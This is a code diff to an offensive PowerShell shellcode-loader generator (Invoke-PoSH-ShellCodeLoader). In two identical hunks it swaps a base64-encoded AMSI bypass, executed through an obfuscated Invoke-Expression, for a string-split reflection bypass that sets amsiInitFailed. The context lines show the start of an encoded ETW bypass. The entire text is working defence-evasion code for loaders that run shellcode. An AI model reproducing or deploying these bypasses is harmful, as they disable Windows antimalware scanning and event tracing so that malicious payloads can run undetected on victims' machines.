@@ -356,14 +356,14 @@ function Invoke-PoSH-ShellCodeLoader {
         }
         
         Write-Output "[*] Adding 'A'M'S'I' bypass"
-        $code_fixed_order4 += '${9} = "JGJ5cCA9IFtSZWZdLkFzc2VtYmx5LkdldFR5cGVzKCk7Rm9yRWFjaCgkYmEgaW4gJGJ5cCkge2lmICgkYmEuTmFtZSAtbGlrZSAiKml1dGlscyIpIHskY2EgPSAkYmF9fTskZGEgPSAkY2EuR2V0RmllbG"' + "`r`n"
-        $ShellCodeLoaderFile += $code_fixed_order4 -join ''
-        $code_fixed_order5 += '${10} = "RzKCdOb25QdWJsaWMsU3RhdGljJyk7Rm9yRWFjaCgkZWEgaW4gJGRhKSB7aWYgKCRlYS5OYW1lIC1saWtlICIqaXRGYWlsZWQiKSB7JGZhID0gJGVhfX07JGZhLlNldFZhbHVlKCRudWxsLCR0cnVlKTsK"' + "`r`n"
-        $ShellCodeLoaderFile += $code_fixed_order5 -join ''
-        $code_fixed_order6 += '${11} = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(${9}+${10}))' + "`r`n"
-        $ShellCodeLoaderFile += $code_fixed_order6 -join ''
-        $code_fixed_order7 += "iN'v'Oke-exPReS'S'iOn"+'(${11})' + "`r`n"
-        $ShellCodeLoaderFile += $code_fixed_order7 -join ''
+        $code_fixed_order4 += '${19} = "System.Management.Automation.A";${21} = "Utils";${20} = "si"' + "`r`n"
+        $stub_template += $code_fixed_order4 -join ''
+        $code_fixed_order5 += '${22} = [Ref].Assembly.GetType((${19}+"m"+${20}+${21}));${24}="Failed"' + "`r`n"
+        $stub_template += $code_fixed_order5 -join ''
+        $code_fixed_order6 += '${23} = ${22}.GetField(("am"+${20}+"Init"+${24}),"NonPublic,Static")' + "`r`n"
+        $stub_template += $code_fixed_order6 -join ''
+        $code_fixed_order7 += '${23}.SetValue($null,$true)' + "`r`n"
+        $stub_template += $code_fixed_order7 -join ''
         
         Write-Output "[*] Adding 'E'T'W' bypass" 
         $code_fixed_order8 += '${12} = "R5cGUoJ1N5c3RlbS5NYW5hJysnZ2VtZW50LkF1dG8nKydtYXRpb24uVHJhY2luZy5QU0V0Jysnd0xvZ1ByJysnb3ZpZGVyJykuR0V0RmllTEQoJ2V0Jysnd1Byb3YnKydpZGVyJywnTm9uUCcrJ3VibGljLFN0YXRpYycpLkdlVFZhTHVlKCRudWxsKSwwKQ=="' + "`r`n"
@@ -525,14 +525,14 @@ function Invoke-PoSH-ShellCodeLoader {
         }
         
         Write-Output "[*] Adding 'A'M'S'I' bypass"
-        $code_fixed_order4 += '${9} = "JGJ5cCA9IFtSZWZdLkFzc2VtYmx5LkdldFR5cGVzKCk7Rm9yRWFjaCgkYmEgaW4gJGJ5cCkge2lmICgkYmEuTmFtZSAtbGlrZSAiKml1dGlscyIpIHskY2EgPSAkYmF9fTskZGEgPSAkY2EuR2V0RmllbG"' + "`r`n"
-        $ShellCodeLoaderFile += $code_fixed_order4 -join ''
-        $code_fixed_order5 += '${10} = "RzKCdOb25QdWJsaWMsU3RhdGljJyk7Rm9yRWFjaCgkZWEgaW4gJGRhKSB7aWYgKCRlYS5OYW1lIC1saWtlICIqaXRGYWlsZWQiKSB7JGZhID0gJGVhfX07JGZhLlNldFZhbHVlKCRudWxsLCR0cnVlKTsK"' + "`r`n"
-        $ShellCodeLoaderFile += $code_fixed_order5 -join ''
-        $code_fixed_order6 += '${11} = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(${9}+${10}))' + "`r`n"
-        $ShellCodeLoaderFile += $code_fixed_order6 -join ''
-        $code_fixed_order7 += "iN'v'Oke-exPReS'S'iOn"+'(${11})' + "`r`n"
-        $ShellCodeLoaderFile += $code_fixed_order7 -join ''
+        $code_fixed_order4 += '${19} = "System.Management.Automation.A";${21} = "Utils";${20} = "si"' + "`r`n"
+        $stub_template += $code_fixed_order4 -join ''
+        $code_fixed_order5 += '${22} = [Ref].Assembly.GetType((${19}+"m"+${20}+${21}));${24}="Failed"' + "`r`n"
+        $stub_template += $code_fixed_order5 -join ''
+        $code_fixed_order6 += '${23} = ${22}.GetField(("am"+${20}+"Init"+${24}),"NonPublic,Static")' + "`r`n"
+        $stub_template += $code_fixed_order6 -join ''
+        $code_fixed_order7 += '${23}.SetValue($null,$true)' + "`r`n"
+        $stub_template += $code_fixed_order7 -join ''
         
         Write-Output "[*] Adding 'E'T'W' bypass" 
         $code_fixed_order8 += '${12} = "R5cGUoJ1N5c3RlbS5NYW5hJysnZ2VtZW50LkF1dG8nKydtYXRpb24uVHJhY2luZy5QU0V0Jysnd0xvZ1ByJysnb3ZpZGVyJykuR0V0RmllTEQoJ2V0Jysnd1Byb3YnKydpZGVyJywnTm9uUCcrJ3VibGljLFN0YXRpYycpLkdlVFZhTHVlKCRudWxsKSwwKQ=="' + "`r`n"
